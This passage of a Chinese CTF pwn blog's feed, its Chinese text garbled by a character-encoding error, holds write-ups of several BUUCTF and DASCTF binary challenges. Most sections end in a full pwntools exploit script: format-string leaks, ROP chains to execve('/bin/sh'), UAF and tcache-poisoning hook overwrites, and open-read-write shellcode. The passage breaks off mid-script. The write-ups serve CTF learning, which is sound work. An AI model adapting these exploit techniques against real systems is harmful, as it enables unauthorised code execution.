æˆå¥‡æ€ªçš„å½±å“ã€‚</p><p>è¯•ç€åˆ†æä¸€ä¸‹ï¼š</p><ul><li>æƒ³è¦æ§åˆ¶espï¼Œå°±å¾—æ§åˆ¶ecx</li><li>æƒ³è¦æ§åˆ¶ecxï¼Œå°±å¾—è‡³å°‘æ§åˆ¶åˆ°ebp-0x4çš„ä½ç½®</li></ul><p>ç”±äºæ˜¯getsçš„è·å–è¾“å…¥ï¼Œè¿™ä¸ªæ˜æ˜¾å¾ˆå®¹æ˜“å®ç°ã€‚</p><p>æ ¸å¿ƒå°±æ˜¯è®©ï¼š</p><pre><code>[ [ebp-0x4] - 0x4] = address(backdoor)</code></pre><p>é™„ä¸ŠæˆåŠŸæ—¶æ ˆæƒ…å†µ,æ–­ç‚¹åœ¨0x80485fd ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/cIBzn5.png" srcset="/img/loading.gif" alt></p><p>ç”±äºæ ˆéšæœºåŒ–ï¼Œå…¶ä¸­éœ€è¦ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„æ¼<code>[ebp-0x4]</code>ï¼Œæ¥è·å–åœ¨<br>ebp-0x4çš„ä½ç½®å¡«å…¥ä»€ä¹ˆå€¼åˆé€‚ï¼Œä»è€Œå®Œæˆæ”»å‡»ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./qiandao&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;183.129.189.60&#39;,10013)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()one = 0x804857D# debug()payload = &#39;%13$p&#39;sla(&#39;name&#39;,payload)ru(&#39;0x&#39;)key = int(r(8),16) - 0x40 + 0x8info_addr(&#39;key&#39;,key)payload = p32(one)*9 + p32(key)sla(&quot;?&quot;,payload)itr()</code></pre><p>å¤šè°ƒè¯•ï¼Œä¼šæ›´å®¹æ˜“ç†è§£ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DASCTFå®‰æ’æœˆèµ›-7th&quot;&gt;&lt;a href=&quot;#DASCTFå®‰æ’æœˆèµ›-7th&quot; class=&quot;headerlink&quot; title=&quot;DASCTFå®‰æ’æœˆèµ›(7th)&quot;&gt;&lt;/a&gt;DASCTFå®‰æ’æœˆèµ›(7th)&lt;/h1&gt;&lt;p&gt;åªåšå‡ºä¸ªç­¾åˆ°é¢˜ï¼Œtclã€‚ã€‚ã€‚&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTFæš‘å‡åˆ·é¢˜(1)</title>
    <link href="http://chumen77.xyz/2020/07/10/BUUCTF%E6%9A%91%E5%81%87%E5%88%B7%E9%A2%98/"/>
    <id>http://chumen77.xyz/2020/07/10/BUUCTFæš‘å‡åˆ·é¢˜/</id>
    <published>2020-07-10T13:16:13.644Z</published>
    <updated>2020-09-02T03:42:38.725Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTFæš‘å‡åˆ·é¢˜-1"><a href="#BUUCTFæš‘å‡åˆ·é¢˜-1" class="headerlink" title="BUUCTFæš‘å‡åˆ·é¢˜(1)"></a>BUUCTFæš‘å‡åˆ·é¢˜(1)</h1><h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a><code>cmcc_simplerop</code></h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>é™æ€é“¾æ¥ã€‚32ä½ç¨‹åºã€‚ç”¨<code>int 80h</code> è¿™ä¸ªä¸­æ–­è°ƒç”¨ï¼Œå‘¼å«ç³»ç»Ÿè°ƒç”¨ç¨‹åº<code>system_call()</code>.ã€‚</p><p>ç„¶årop æ§åˆ¶EAX = 0Xb = 11ï¼ŒEBX = &amp;(â€œ/bin/shâ€), ECX = EDX = 0ï¼Œå³æ‰§è¡Œäº†<code>sys_execve(&quot;/bin/sh&quot;, 0, 0, 0)</code>ï¼Œå³å¯æ‹¿åˆ°shellã€‚</p><p>32ä½ç³»ç»Ÿè°ƒç”¨è¡¨ï¼š<a href="https://blog.csdn.net/xiaominthere/article/details/17287965" target="_blank" rel="noopener">https://blog.csdn.net/xiaominthere/article/details/17287965</a></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./simplerop&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29124)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()offset = 32start = 0x8048E45read = 0x806CD50pop_eax_ret = 0x080bae06pop_ebx_ret = 0x080481c9pop_ecx_ebx_ret = 0x0806e851pop_edx_ret = 0x0806e82apop3_ret = 0x08048913bss = 0x80EC2EC - 0x10ret = 0x8048E6Fin_t_0x80 = 0x080493e1payload = &#39;a&#39; * offset + flat([read,pop3_ret,0,bss,0x8])payload += flat([pop_eax_ret,11,pop_ecx_ebx_ret,0,bss,pop_edx_ret,0,in_t_0x80])sa(&#39;:&#39;,payload)s(&#39;/bin/sh\x00&#39;)itr()</code></pre><p>å…¶ä¸­ropé“¾readåè¿”å›åœ°å€ï¼š<code>pop3_ret</code>ï¼Œæ˜¯ä¸ºäº†pop <code>0,bss,0x8</code>ï¼Œç„¶åå†è·Ÿç€ropã€‚</p><h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a><code>ciscn_2019_n_3</code></h2><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>Ubuntu 18 ,å­˜åœ¨UAFæ¼æ´ã€‚</p><pre><code class="c">int __cdecl rec_str_free(void *ptr){  free(*((void **)ptr + 2));  free(ptr);  return puts(&quot;Note freed!&quot;);}</code></pre><p>æ¯åˆ›å»ºä¸€ä¸ªå †ï¼Œå°±æœ‰ä¸€ä¸ª0x10çš„å †ç©ºé—´ï¼Œå­˜æ”¾å‡½æ•°æŒ‡é’ˆã€‚ä¸€çœ‹åˆ°è¿™ä¸ªï¼Œå°±å¯ä»¥è¯´æ˜¯æš—ç¤ºæ”»å‡»è¿™ä¸ªåœ°æ–¹æ¥åŠ«æŒç¨‹åºæµç¨‹ã€‚</p><pre><code class="c">int do_del(){  int v0; // eax  v0 = ask((int)&quot;Index&quot;);  return (*(int (__cdecl **)(int))(records[v0] + 4))(records[v0]);}</code></pre><p>åˆ©ç”¨è¿™ä¸ªå‡½æ•°æ¥åŠ«æŒç¨‹åºæµç¨‹ã€‚<br>å…ˆ<code>new(0,2,0x40,payload)</code>çœ‹ä¸€ä¸‹ç¨‹åºçš„å†…å­˜æƒ…å†µ, å¯¹äºå…¶ä¸­çš„<code>(*(int (__cdecl **)(int))(records[v0] + 4))(records[v0])</code> ï¼š</p><pre><code class="c">gefâ¤  p &amp;records$1 = (&lt;data variable, no debug info&gt; *) 0x804b080 &lt;records&gt;gefâ¤  x/wx 0x804b0800x804b080 &lt;records&gt;:    0x08635160gefâ¤  x/wx 0x086351600x8635160:      0x080486de</code></pre><p>æ‰€ä»¥ <code>records[v0]</code>  = 0x08635160 </p><pre><code class="c">gefâ¤  x/wx 0x08635160+40x8635164:      0x08048725gefâ¤  x/i 0x08048725   0x8048725 &lt;rec_str_free&gt;:    push   ebp</code></pre><p>æ‰€ä»¥ <code>*(int (__cdecl **)(int))(records[v0] + 4))</code>  = <code>0x8048725 &lt;rec_str_free&gt;:</code></p><p>ä¸”<br><img src="http://qiqianyun.chumen77.xyz/uPic/VT03Ns.png" srcset="/img/loading.gif" alt><br>å¦‚å›¾ï¼ŒæŠŠè¿™é‡Œçš„å‡½æ•°æŒ‡é’ˆæ§åˆ¶æˆ<code>sh\x00\00</code> + <code>&amp;system</code> ,å³æ‰§è¡Œ<code>do_del</code>æ—¶ï¼Œè¿è¡Œçš„å°±æ˜¯<code>system(sh)</code>å¯æ‹¿åˆ°shellã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_2019_n_3&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,26453)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def new(id,type,len,context):    sla(&quot;CNote &gt;&quot;,&#39;1&#39;)    sla(&quot;dex &gt;&quot;,str(id))    sla(&quot;Type &gt;&quot;,str(type))    sla(&quot;th &gt;&quot;,str(len))    sa(&quot;ue &gt;&quot;,str(context))def free(id):    sla(&quot;CNote &gt;&quot;,&#39;2&#39;)    sla(&quot;dex &gt;&quot;,str(id))def show(id):    sla(&quot;CNote &gt;&quot;,&#39;3&#39;)    sla(&quot;dex &gt;&quot;,str(id))payload = &quot;a&quot; + &#39;\n&#39;new(0,2,0x40,payload)new(1,2,0x40,payload)free(1)free(0)system = elf.plt[&#39;system&#39;]new(2,2,0x9,&#39;sh\x00\x00&#39;+ p32(system))free(1)itr()</code></pre><h4 id="æ— systemå‡½æ•°æƒ…å†µä¸‹"><a href="#æ— systemå‡½æ•°æƒ…å†µä¸‹" class="headerlink" title="æ— systemå‡½æ•°æƒ…å†µä¸‹"></a>æ— systemå‡½æ•°æƒ…å†µä¸‹</h4><p>Leak libcï¼Œè¿˜æ˜¯æ”»å‡»é‚£ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œæœ¬åœ°é€šè¿œç¨‹æ²¡é€šã€‚</p><p>åœ¨æµ‹è¯•çš„æ—¶å€™ï¼Œç”±äºfgetsæ€»æ˜¯åœ¨ä½ ä¼ å…¥çš„å­—ç¬¦ä¸²ååŠ ä¸Š<code>\x00</code>ï¼Œæ›¾ç»å°±é‡åˆ°<br>è¿‡ï¼Œå¯¼è‡´æ³„æ¼ååˆ†éš¾è¿›è¡Œï¼Œä½†æ˜¯å‘ç°ï¼š</p><pre><code class="python">payload = &#39;&#39;new(2,2,0x0,payload)ru(&quot;lue=&quot;)libc_base = uu32(r(4)) - 0x1d89d8</code></pre><p>ä¼ å…¥ç©ºå­—èŠ‚ç«Ÿç„¶å¯ä»¥é€šè¿‡ï¼Œä¸”æ²¡æœ‰åŠ ä¸Š<code>\x00</code>ï¼Œä»è€Œä¸å½±å“æ³„æ¼libcã€‚è¿˜ä¸çŸ¥é“æ˜¯å¦ä»¥åé‡åˆ°fgetså‡½æ•°å°±å¯ä»¥è¿™æ ·å¤„ç†å…¶å½±å“ï¼Œå…ˆæŒ–ä¸ªå‘ï¼Œè®°å½•ç€ã€‚</p><pre><code class="python">payload = &#39;a&#39; + &#39;\n&#39;new(0,2,0x400,payload)new(1,2,0x400,payload)free(0)payload = &#39;&#39;new(2,2,0x0,payload)ru(&quot;lue=&quot;)libc_base = uu32(r(4)) - 0x1d89d8info_addr(&quot;libc_base&quot;,libc_base)payload = &#39;\x00&#39;*4 + &#39;/bin/sh\x00&#39; +&#39;\n&#39;new(3,2,0x400-0x10-0x10,payload)new(4,2,0x40,payload)new(5,2,0x40,payload)free(5)free(4)rec = libc_base + 0x3d123new(6,2,0x9,p32(rec) + p32(rec))# free(5)show(5)# debug()itr()</code></pre><h2 id="V-amp-N2020easyTHeap"><a href="#V-amp-N2020easyTHeap" class="headerlink" title="V&amp;N2020easyTHeap"></a>V&amp;N2020easyTHeap</h2><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>Ubuntu 18 ,å­˜åœ¨UAFæ¼æ´ï¼Œtcache dupæ”»å‡»ã€‚</p><p>è€ƒç‚¹ï¼š</p><ul><li>æ”»å‡»<code>tcache_perthread_struct</code>ï¼Œä¼ªé€ tcacheå·²ç»æ»¡äº†</li><li>æ”»å‡»<code>tcache_entry</code>ï¼Œåœ¨æŒ‡å®šçš„ä½ç½®å†™ä¸Šç›®æ ‡åœ°å€ï¼Œåœ¨ç”³è¯·ä¸€ä¸ªå¯¹åº”å¤§å°çš„å †ï¼Œå³å¯å®ç°ä»»æ„åœ°å€å†™å…¥ã€‚<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3></li></ul><pre><code class="python">from pwn import *import timelocal_file  = &#39;./vn_pwn_easyTHeap&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;remote_libc = &#39;./libc-2.27.so&#39;context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,25814)    libc = ELF(remote_libc)elf = ELF(local_file)# libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size):    sla(&quot;choice&quot;,&#39;1&#39;)    sla(&quot;?&quot;,str(size))def edit(idx,context):    sla(&quot;choice&quot;,&#39;2&#39;)    sla(&#39;idx&#39;,str(idx))    sa(&#39;content&#39;,str(context))def show(idx):    sla(&#39;choice&#39;,&#39;3&#39;)    sla(&#39;idx&#39;,str(idx))def free(idx):    sla(&#39;choice&#39;,&#39;4&#39;)    sla(&quot;idx&quot;,str(idx))add(0x100) #0add(0x100) #1free(0)free(0)show(0)r()heapbase = uu64(r(6)) - 0x260info_addr(&#39;heapbase&#39;,heapbase)add(0x100) #2edit(2,p64(heapbase+0x10))add(0x100) #3add(0x100) #4edit(4,&#39;\x07&#39;*0x10)free(0)show(0)r()libc_base = uu64(r(6)) - 0x3ebca0info_addr(&#39;libc_base&#39;,libc_base)__malloc_hook = libc_base + 0x3ebc30__realloc_hook = __malloc_hook -0x8payload = &#39;\x00&#39; * (8+7) + &#39;\x01&#39; + &#39;\x00&#39; * (0x80 - 8 - 8) + &#39;\x00&#39; * 0x38 + p64(__realloc_hook)edit(4,payload)add(0x100) #5onerec = 0x10a38c + libc_baserealloc_addr = libc_base + libc.symbols[&#39;__libc_realloc&#39;]info_addr(&#39;relloc&#39;,realloc_addr)info_addr(&#39;__malloc_hook&#39;,__malloc_hook)payload = p64(onerec) + p64(realloc_addr+8)edit(5,payload)add(0x100)#debug()itr()</code></pre><h2 id="ciscn-2019-final-3"><a href="#ciscn-2019-final-3" class="headerlink" title="ciscn_2019_final_3"></a><code>ciscn_2019_final_3</code></h2><h3 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>Ubuntu 18ï¼Œä¿æŠ¤å…¨å¼€ï¼Œå­˜åœ¨uafæ¼æ´ã€‚</p><p>ç¨‹åºåªæœ‰å¢åŠ å’Œåˆ é™¤çš„åŠŸèƒ½ï¼Œä½†æ˜¯å¢åŠ ä¸€ä¸ªå †å—åå›ç»™ä½ è¿”å›ç”³è¯·å †å—çš„åœ°å€ä¿¡æ¯ã€‚</p><pre><code class="c"> printf(&quot;gift :%p\n&quot;, heaplist[HIDWORD(size)]);</code></pre><p>åˆ é™¤å †åï¼Œæ²¡æœ‰ç½®0çš„æ“ä½œï¼Œå­˜åœ¨uafã€‚</p><p>è€ƒç‚¹ï¼š</p><ul><li>æ”»å‡»<code>tcache_perthread_struct</code>ï¼Œä¼ªé€ tcacheå·²ç»æ»¡äº†</li><li>æ”»å‡»<code>tcache_entry</code>ï¼Œåœ¨æŒ‡å®šçš„ä½ç½®å†™ä¸Šç›®æ ‡åœ°å€ï¼Œåœ¨ç”³è¯·ä¸€ä¸ªå¯¹åº”å¤§å°çš„å †ï¼Œå³å¯å®ç°ä»»æ„åœ°å€å†™å…¥ã€‚</li></ul><p>éš¾ç‚¹ï¼š</p><ul><li>æ³„æ¼libcåœ°å€</li><li>ç²¾å·§çš„æ„é€ ä¸€ä¸ªä»»æ„åœ°å€å†™ï¼ˆåœ¨<code>tcache struct</code>å¤„æŠ˜è…¾ï¼‰</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="c">from pwn import *import timelocal_file  = &#39;./ciscn_final_3&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27714)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = []realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size,content):    sla(&quot;&gt;&quot;,&#39;1&#39;)    sla(&#39;index&#39;,str(idx))    sla(&#39;size&#39;,str(size))    sa(&#39;thing&#39;,str(content))    ru(&quot;0x&quot;)    gift = int(r(12),16)    info_addr(&#39;gift&#39;,gift)    return giftdef free(idx):    sla(&quot;&gt;&quot;,&#39;2&#39;)    sla(&quot;index&quot;,str(idx))heap_base = add(0,0x48,&#39;a&#39;) - 0x11e70free(0)free(0)add(1,0x48,p64(heap_base+0x10))add(2,0x48,p64(heap_base+0x10))payload = 0x30 * &#39;\x07&#39;add(3,0x48,payload)free(3)payload = 0x30 * &#39;\x00&#39;add(4,0x48,payload)add(5,0x10,&#39; &#39;)libc_base = add(6,0x78,&#39; &#39;) - 0x3ebca0info_addr(&#39;libc_base&#39;,libc_base)free_hook = libc_base + 0x3ed8e8free(5)add(7,0x10,p64(free_hook)*2)one_rec = 0x4f322 + libc_baseadd(8,0x48,p64(one_rec))# debug()free(4)itr()</code></pre><p>è°ƒè¯•ä¸€ä¸‹å°±æ‡‚äº†ã€‚å…¶ä¸­0x10é‚£ä¸ªå †å—çš„ç”³è¯·å¾ˆé‡è¦ï¼Œæ­£å¥½å¯ä»¥ä¾›åé¢çš„ä½¿ç”¨ã€‚</p><h2 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a><code>picoctf_2018_rop chain</code></h2><h3 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>åªæ˜¯ä¸€ä¸ªç®€å•çš„ropï¼Œè€ƒçš„å°±æ˜¯32ä½ä¸‹å¦‚ä½•æ§åˆ¶ä¼ å‚æ•°ã€‚</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./PicoCTF_2018_rop_chain&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29550)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;] #,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = []realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()win_function1 = 0x080485CBwin_function2 = 0x80485D8flag = 0x0804862Boffset = 0x18 + 4ru(&#39;Enter your input&gt;&#39;)payload = &#39;a&#39; * offset + flat([win_function1,win_function2,flag,0xBAAAAAAD,0xDEADBAAD])# debug()s(payload + &#39;\n&#39;)itr()</code></pre><h2 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable_orw"></a><code>pwnable_orw</code></h2><h3 id="åˆ†æ-5"><a href="#åˆ†æ-5" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è€ƒç‚¹ ï¼š</p><ul><li>ç®€å•shellcode çš„ç¼–å†™</li><li>seccompï¼ˆæŒ–å‘ï¼‰</li></ul><p><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p><p><a href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/" target="_blank" rel="noopener">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/P0Ku7D.png" srcset="/img/loading.gif" alt></p><p>å…ˆç”¨<code>seccomp-tools</code>çœ‹ä¸‹ç¦ç”¨äº†ä»€ä¹ˆå‡½æ•°ï¼š</p><pre><code>âœ  pwnable_orw seccomp-tools dump ./orw line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38) 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</code></pre><p>æ˜æ˜¾åªèƒ½æ‰§è¡Œ open read wirte å‡½æ•°ã€‚</p><pre><code>#è¿™é‡Œå¯ä»¥ç”¨pwntoolsåº“çš„ä¸€ä¸ªå‡½æ•°ä»£æ›¿,shellcraftcè¯­è¨€:open(&quot;/home/orw/flag&quot;) &lt;==&gt; æ±‡ç¼–:asm(shellcraft.open(&quot;/home/orw/flag&quot;))cè¯­è¨€:read(3,buf,0x20)&lt;==&gt; æ±‡ç¼–:asm(shellcraft.read(3,&quot;esp&quot;,0x20)cè¯­è¨€:write(1,buf,0x20)&lt;==&gt;æ±‡ç¼–:asm(shellcraft.write(1,&quot;esp&quot;,0x20))</code></pre><p>å…¶ä¸­ å°±æ˜¯ä»¥espå½“åšä¸´æ—¶å˜é‡ bufçš„åœ°å€ï¼Œå…¶å¯ä»¥è‡ªå®šä¹‰ã€‚</p><p>å…¶ä¸­openå‡½æ•°æ‰§è¡Œåï¼Œç”±äºæ˜¯æ‰“å¼€äº†ä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œå…¶è¿”å›çš„fdå°±æ˜¯3ï¼Œæ‰€ä»¥åé¢è·Ÿç€çš„readçš„æ–‡ä»¶æè¿°ç¬¦ä¹Ÿä¸º3ã€‚</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./orw&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,26224)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = []realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()bss = 0x804A128 - 0x30payload= 